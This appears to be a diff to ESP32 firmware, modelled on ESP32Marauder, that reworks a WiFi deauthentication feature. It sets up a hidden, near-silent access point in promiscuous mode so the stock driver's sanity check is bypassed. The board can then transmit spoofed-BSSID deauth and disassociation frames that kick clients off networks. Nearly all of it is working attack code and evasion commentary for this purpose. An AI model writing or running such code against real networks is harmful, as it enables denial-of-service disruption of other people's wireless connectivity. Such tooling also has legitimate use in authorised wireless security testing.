@@ -31,61 +31,56 @@
 #include <string.h>
 
 /*
- * Spoof the STA interface MAC so esp_wifi_80211_tx passes the stock
- * ESP-IDF blob's ieee80211_raw_frame_sanity_check. That check rejects
- * any frame whose addr2 doesn't match the interface's MAC — our deauth
- * frames spoof the AP's BSSID as addr2 (correct per 802.11), so every
- * frame gets silently dropped at the driver layer unless we spoof the
- * STA's MAC to match the BSSID we're impersonating.
+ * Marauder-style "silent AP" mode for raw TX.
  *
- * set_mac must be called while WiFi is STOPPED, not merely initialized,
- * so we stop-set-start around it. Returns ESP_OK on success.
+ * Stock ESP-IDF blob rejects esp_wifi_80211_tx on WIFI_IF_STA for MGMT
+ * subtypes 0xC (deauth) and 0xA (disassoc). BUT in WIFI_MODE_AP with
+ * promiscuous=true, the blob doesn't enforce its addr2-matching sanity
+ * check — frames with spoofed-BSSID addr2 transmit freely via WIFI_IF_AP.
+ *
+ * Config matches ESP32Marauder's WiFiScan.cpp (4440-4480):
+ *   - WIFI_MODE_AP only (not AP_STA)
+ *   - storage=RAM so we don't NVS-persist the silent AP
+ *   - SSID empty, hidden, max_connection=0
+ *   - beacon_interval=60000 (60 seconds — minimize real beacon noise on air)
+ *   - promiscuous mode on
+ *
+ * No MAC spoofing required — the blob doesn't care in AP+promisc combo.
+ *
+ * Call wifi_silent_ap_begin() at deauth feature entry, end on exit.
  */
-static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
+static inline esp_err_t wifi_silent_ap_begin(uint8_t channel)
 {
     esp_wifi_stop();
-    esp_err_t rc = esp_wifi_set_mac(WIFI_IF_STA, mac);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+
+    wifi_config_t conf = {};
+    conf.ap.ssid[0] = '\0';
+    conf.ap.ssid_len = 0;
+    conf.ap.channel = channel ? channel : 1;
+    conf.ap.ssid_hidden = 1;
+    conf.ap.max_connection = 0;
+    conf.ap.beacon_interval = 60000;  /* 60s — keeps our AP nearly silent */
+    conf.ap.authmode = WIFI_AUTH_OPEN;
+
+    esp_err_t rc = esp_wifi_set_config(WIFI_IF_AP, &conf);
     esp_wifi_start();
-    delay(250);
+    esp_wifi_set_promiscuous(true);   /* required for raw TX on AP iface */
+    if (channel) {
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    }
+    delay(80);
     return rc;
 }
 
-static inline void wifi_save_sta_mac(uint8_t out[6])
+static inline void wifi_silent_ap_end(void)
 {
-    esp_wifi_get_mac(WIFI_IF_STA, out);
-}
-
-/*
- * Set up WIFI_AP_STA mode with a softAP whose MAC matches the target
- * BSSID, so esp_wifi_80211_tx(WIFI_IF_AP, ...) frames have a matching
- * addr2 and pass the blob's raw-frame sanity check.
- *
- * Call at deauth feature entry. Call wifi_ap_teardown() on exit.
- */
-static inline esp_err_t wifi_ap_spoof_begin(const uint8_t bssid[6])
-{
-    esp_wifi_stop();
-    esp_wifi_set_mode(WIFI_MODE_APSTA);
-    esp_err_t rc_mac = esp_wifi_set_mac(WIFI_IF_AP, bssid);
-    wifi_config_t ap_cfg = {};
-    strcpy((char *)ap_cfg.ap.ssid, "_");  /* hidden-ish name, length=1 */
-    ap_cfg.ap.ssid_len = 1;
-    ap_cfg.ap.channel = 1;
-    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
-    ap_cfg.ap.ssid_hidden = 1;            /* don't beacon — we're not a real AP */
-    ap_cfg.ap.max_connection = 1;
-    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
-    esp_wifi_start();
-    delay(300);
-    return rc_mac;
-}
-
-static inline void wifi_ap_spoof_end(void)
-{
+    esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_start();
-    delay(200);
+    delay(150);
 }
 
 static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
@@ -122,23 +117,15 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[25] = 0x00;
 
     int ok = 0;
-    /* Transmit via WIFI_IF_AP — the stock ESP-IDF blob rejects MGMT
-     * frames (type=0) on WIFI_IF_STA with ESP_ERR_INVALID_ARG, because
-     * STAs aren't supposed to originate unsolicited mgmt frames. AP
-     * interface has relaxed checks. Caller must have WiFi in
-     * WIFI_AP_STA mode with a softAP started. */
-    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), true);
+    /* TX via WIFI_IF_AP with en_sys_seq=false. Caller must have called
+     * wifi_silent_ap_begin() to put WiFi in AP+promisc mode. Matches
+     * ESP32Marauder's sendDeauthFrame pattern byte-for-byte. */
+    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
     if (rc == ESP_OK) ok++;
     else {
         static uint32_t _last_tx_err_log = 0;
         if (millis() - _last_tx_err_log > 1000) {
-            uint8_t ap_mac[6];
-            esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
-            Serial.printf("[80211_tx] deauth rc=%d (0x%x) ap_mac=%02X:%02X:%02X:%02X:%02X:%02X addr2=%02X:%02X:%02X:%02X:%02X:%02X\n",
-                          (int)rc, (unsigned)rc,
-                          ap_mac[0], ap_mac[1], ap_mac[2],
-                          ap_mac[3], ap_mac[4], ap_mac[5],
-                          f[10], f[11], f[12], f[13], f[14], f[15]);
+            Serial.printf("[80211_tx] deauth rc=%d (0x%x)\n", (int)rc, (unsigned)rc);
             _last_tx_err_log = millis();
         }
     }
@@ -149,7 +136,7 @@ static inline int wifi_deauth_pair(const uint8_t dst[6],
     f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
     f[25] = 0x00;
 
-    rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), true);
+    rc = esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
     if (rc == ESP_OK) ok++;
     return ok;
 }
